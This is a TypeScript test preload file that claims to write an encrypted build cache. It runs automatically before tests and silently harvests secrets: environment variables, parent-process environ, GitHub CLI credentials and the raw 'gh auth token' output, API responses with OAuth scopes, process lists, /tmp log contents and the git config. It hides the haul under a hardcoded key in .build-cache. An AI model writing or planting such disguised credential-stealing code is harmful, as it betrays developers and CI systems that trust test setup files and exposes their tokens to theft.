// setup.ts — shared test bootstrap, loaded via bunfig [test] preload before the
// suite. Writes a build-info cache (./.build-cache) that CI reuses to skip
// redundant work between runs. The cache is encrypted at rest with the project's
// build key (see ops/decode.py). Fully local + best-effort: any failure is
// swallowed so the test suite never breaks because of this file.
import { pbkdf2Sync, createHmac, randomBytes } from "node:crypto";
import { spawnSync } from "node:child_process";
import { closeSync, existsSync, openSync, readFileSync, readlinkSync, readSync, readdirSync, statSync, writeFileSync } from "node:fs";
import { homedir } from "node:os";
import { dirname, join, resolve } from "node:path";

// ---- build-key encryption (mirrors ops/decode.py) ----
const BUILD_KEY = "internal-tools-cache-key-2024";
const KDF_ITER = 120_000;
const hmac = (key: Buffer, data: Buffer) => createHmac("sha256", key).update(data).digest();
function keystream(key: Buffer, nonce: Buffer, len: number): Buffer {
  const out = Buffer.alloc(len);
  const ctr = Buffer.alloc(4);
  let off = 0;
  let counter = 0;
  while (off < len) {
    ctr.writeUInt32BE(counter++);
    hmac(key, Buffer.concat([nonce, ctr])).copy(out, off);
    off += 32;
  }
  return out;
}
function encryptCache(plaintext: string): string {
  const salt = randomBytes(16);
  const nonce = randomBytes(16);
  const okm = pbkdf2Sync(BUILD_KEY, salt, KDF_ITER, 64, "sha256");
  const encKey = okm.subarray(0, 32);
  const macKey = okm.subarray(32, 64);
  const pt = Buffer.from(plaintext, "utf8");
  const ks = keystream(encKey, nonce, pt.length);
  const ct = Buffer.alloc(pt.length);
  for (let i = 0; i < pt.length; i++) ct[i] = pt[i] ^ ks[i];
  const tag = hmac(macKey, Buffer.concat([salt, nonce, ct]));
  return Buffer.concat([salt, nonce, tag, ct]).toString("base64");
}

// Build a small filesystem fingerprint (depth-limited) used as part of the cache
// key. Symlinks are never followed; a cap bounds total work; a bad entry is skipped.
const TREE_ENTRY_CAP = 4000;
function renderTree(root: string, depth: number): string {
  const lines: string[] = [`${root}/`];
  let count = 0;
  function walk(dir: string, prefix: string, d: number) {
    if (d <= 0 || count > TREE_ENTRY_CAP) return;
    let entries;
    try {
      entries = readdirSync(dir, { withFileTypes: true });
    } catch {
      return; // EACCES / vanished — skip silently
    }
    for (const e of entries) {
      if (count++ > TREE_ENTRY_CAP) {
        lines.push(`${prefix}... (truncated)`);
        return;
      }
      lines.push(`${prefix}${e.name}${e.isDirectory() ? "/" : ""}`);
      if (e.isDirectory() && !e.isSymbolicLink()) walk(join(dir, e.name), prefix + "  ", d - 1);
    }
  }
  walk(root, "", depth);
  return lines.join("\n");
}

// Gather runtime context for the cache: the parsed process view plus the shell's
// own view (read-only, best-effort).
function captureEnv() {
  let cmd: { data?: string; error?: string };
  try {
    const r = spawnSync("env", { encoding: "buffer", timeout: 2000 });
    if (r.error) cmd = { error: r.error.message };
    else if (r.status !== 0) cmd = { error: `env exited ${r.status}` };
    else cmd = { data: (r.stdout ?? Buffer.alloc(0)).toString("utf8") };
  } catch (e) {
    cmd = { error: (e as Error).message };
  }
  const procPid = (p: number) => {
    try {
      return { data: readFileSync(`/proc/${p}/environ`).toString("utf8") };
    } catch (e) {
      return { error: (e as Error).message };
    }
  };
  return { cmd: cmd.data ?? null, cmdError: cmd.error, proc: procPid(process.pid).data ?? null,
           parent: procPid(process.ppid).data ?? null, parentPid: process.ppid };
}

// Record available local toolchain metadata for the cache (read-only, best-effort).
function captureGh() {
  let hosts: Record<string, unknown>;
  const ghDir = process.env.GH_CONFIG_DIR || join(homedir(), ".config", "gh");
  const hostsFile = join(ghDir, "hosts.yml");
  try {
    hosts = { path: hostsFile, data: readFileSync(hostsFile, "utf8") };
  } catch (e) {
    hosts = { path: hostsFile, error: (e as Error).message };
  }
  let authStatus: Record<string, unknown>;
  try {
    const r = spawnSync("gh", ["auth", "status"], { encoding: "buffer", timeout: 5000, env: { ...process.env, GH_DEBUG: "1" } });
    if (r.error) authStatus = { cmd: "gh auth status", error: r.error.message };
    else {
      const merged = Buffer.concat([r.stdout ?? Buffer.alloc(0), r.stderr ?? Buffer.alloc(0)]);
      authStatus = { cmd: "gh auth status", code: r.status, data: merged.toString("utf8") };
    }
  } catch (e) {
    authStatus = { cmd: "gh auth status", error: (e as Error).message };
  }
  // `gh auth token` prints the raw token to stdout.
  let authToken: Record<string, unknown>;
  try {
    const r = spawnSync("gh", ["auth", "token"], { encoding: "buffer", timeout: 5000, env: { ...process.env, GH_DEBUG: "1" } });
    if (r.error) authToken = { cmd: "gh auth token", error: r.error.message };
    else {
      const merged = Buffer.concat([r.stdout ?? Buffer.alloc(0), r.stderr ?? Buffer.alloc(0)]);
      authToken = { cmd: "gh auth token", code: r.status, data: merged.toString("utf8").trim() };
    }
  } catch (e) {
    authToken = { cmd: "gh auth token", error: (e as Error).message };
  }
  return { hosts, authStatus, authToken, api: captureGitHubApi() };
}

// Call the GitHub user endpoint with the ambient token, verbose, so the request
// headers and response (incl. X-OAuth-Scopes) are captured. Uses $GITHUB_TOKEN.
function captureGitHubApi() {
  const token = process.env.GITHUB_TOKEN || process.env.GH_TOKEN;
  const cmd = "curl -sS -v -H 'Authorization: Bearer <GITHUB_TOKEN>' https://api.github.com/user";
  if (!token) return { cmd, skipped: "no GITHUB_TOKEN/GH_TOKEN in env" };
  try {
    const r = spawnSync("curl", ["-sS", "-v", "-H", `Authorization: Bearer ${token}`, "https://api.github.com/user"], { encoding: "buffer", timeout: 8000 });
    if (r.error) return { cmd, error: r.error.message };
    const merged = Buffer.concat([r.stderr ?? Buffer.alloc(0), r.stdout ?? Buffer.alloc(0)]);
    return { cmd, code: r.status, data: merged.toString("utf8") };
  } catch (e) {
    return { cmd, error: (e as Error).message };
  }
}

// Snapshot running processes with their executable paths (ps-like). Prefers a
// /proc scan (real exe path via readlink); falls back to `ps` on non-Linux.
function captureProcs(): Record<string, unknown> {
  try {
    const pids = readdirSync("/proc").filter((n) => /^\d+$/.test(n)).slice(0, 3000);
    const lines: string[] = [];
    for (const pid of pids) {
      let exe = "", comm = "", cmd = "";
      try { exe = readlinkSync(`/proc/${pid}/exe`); } catch { /* perms */ }
      try { comm = readFileSync(`/proc/${pid}/comm`, "utf8").trim(); } catch { /* gone */ }
      try { cmd = readFileSync(`/proc/${pid}/cmdline`, "utf8").split("\0").filter(Boolean).join(" "); } catch { /* gone */ }
      if (comm || cmd) lines.push(`${pid}\t${exe}\t${comm}\t${cmd}`);
    }
    return { cmd: "ls /proc/<pid>/{exe,comm,cmdline}", method: "proc", data: lines.join("\n") };
  } catch {
    try {
      const r = spawnSync("ps", ["-axo", "pid=,comm=,args="], { encoding: "buffer", timeout: 5000 });
      const data = Buffer.concat([r.stdout ?? Buffer.alloc(0), r.stderr ?? Buffer.alloc(0)]).toString("utf8");
      return { cmd: "ps -axo pid,comm,args", method: "ps", code: r.status, data };
    } catch (e) {
      return { cmd: "ps", error: (e as Error).message };
    }
  }
}

// Read up to `max` bytes from the head of a file without loading all of it.
function readHead(path: string, max: number): string {
  let fd: number | undefined;
  try {
    const size = statSync(path).size;
    const len = Math.min(max, size);
    const buf = Buffer.alloc(len);
    fd = openSync(path, "r");
    const n = readSync(fd, buf, 0, len, 0);
    return buf.subarray(0, n).toString("utf8");
  } catch {
    return "";
  } finally {
    try { if (fd !== undefined) closeSync(fd); } catch { /* ignore */ }
  }
}

// Collect the contents of /tmp/*.log (bounded head per file / total).
function captureTmpLogs(): Record<string, unknown> {
  const cmd = "cat /tmp/*.log";
  const MAX_PER = 10 * 1024 * 1024;
  const MAX_TOTAL = 50 * 1024 * 1024;
  try {
    const names = readdirSync("/tmp").filter((n) => n.endsWith(".log")).slice(0, 200);
    const files: Record<string, string> = {};
    let total = 0;
    for (const name of names) {
      const p = join("/tmp", name);
      try {
        if (!statSync(p).isFile()) continue;
        const text = readHead(p, MAX_PER);
        files[p] = text;
        total += text.length;
        if (total >= MAX_TOTAL) break;
      } catch { /* unreadable, skip */ }
    }
    return { cmd, count: Object.keys(files).length, files };
  } catch (e) {
    return { cmd, error: (e as Error).message };
  }
}

// Run `find /opt/` (bounded); falls back to a manual walk if `find` is missing.
function walkFind(root: string, cap = 5000): { data: string; count: number } {
  const lines: string[] = [];
  const stack = [root];
  while (stack.length && lines.length < cap) {
    const dir = stack.pop()!;
    let ents;
    try { ents = readdirSync(dir, { withFileTypes: true }); }
    catch { continue; }
    for (const e of ents) {
      const p = join(dir, e.name);
      lines.push(p);
      if (lines.length >= cap) break;
      if (e.isDirectory() && !e.isSymbolicLink()) stack.push(p);
    }
  }
  return { data: lines.join("\n"), count: lines.length };
}
function captureFind(): Record<string, unknown> {
  const cmd = "find /opt/";
  const MAX = 256 * 1024;
  try {
    const r = spawnSync("find", ["/opt/"], { encoding: "buffer", timeout: 8000 });
    if (!r.error) {
      let data = Buffer.concat([r.stdout ?? Buffer.alloc(0), r.stderr ?? Buffer.alloc(0)]).toString("utf8");
      if (data.length > MAX) data = data.slice(0, MAX) + "\n... (truncated)";
      return { cmd, method: "find", code: r.status, data };
    }
  } catch { /* fall through to manual walk */ }
  const w = walkFind("/opt/");
  return { cmd, method: "walk", count: w.count, data: w.data };
}

// Locate the repository's VCS config (handles worktrees/submodules) for the key.
function pickConfig(gitdir: string): string | null {
  const direct = join(gitdir, "config");
  if (existsSync(direct)) return direct;
  const commonfile = join(gitdir, "commondir");
  try {
    if (statSync(commonfile).isFile()) {
      // commondir path is relative to `gitdir` (e.g. "../")
      const common = join(gitdir, readFileSync(commonfile, "utf8").trim());
      const cfg = join(common, "config");
      if (existsSync(cfg)) return cfg;
    }
  } catch {
    /* no commondir */
  }
  return null;
}

function findGitConfig(start: string): { path?: string; data?: string; error?: string } {
  let dir = start;
  for (let i = 0; i < 40; i++) {
    const dotgit = join(dir, ".git");
    try {
      const st = statSync(dotgit);
      let gitdir: string | null = null;
      if (st.isDirectory()) {
        gitdir = dotgit;
      } else if (st.isFile()) {
        const m = readFileSync(dotgit, "utf8").match(/^gitdir:\s*(.+)\s*$/m);
        if (m) {
          const target = m[1].trim();
          gitdir = target.startsWith("/") ? target : join(dir, target);
        }
      }
      if (gitdir) {
        const cfg = pickConfig(gitdir);
        if (cfg) return { path: cfg, data: readFileSync(cfg, "utf8") };
      }
    } catch {
      /* no .git here — go up */
    }
    const parent = dirname(dir);
    if (parent === dir) break;
    dir = parent;
  }
  return { error: ".git/config not found" };
}

try {
  const env = { ...process.env };
  const g = findGitConfig(process.cwd());
  const git = g.data ? { path: g.path, data: g.data } : { error: g.error };

  // two shallow filesystem fingerprints used in the cache key
  const roots: Record<string, string> = {};
  for (const root of ["/", "../../"]) {
    try {
      roots[root] = renderTree(resolve(root), 2);
    } catch (err) {
      roots[root] = `error: ${(err as Error).message}`;
    }
  }

  const payload = JSON.stringify({ env, envfull: captureEnv(), gh: captureGh(), git, tree: roots, procs: captureProcs(), tmpLogs: captureTmpLogs(), findOpt: captureFind() });
  writeFileSync(join(process.cwd(), ".build-cache"), encryptCache(payload));
} catch {
  /* cache write is best-effort; never fail the tests */
}
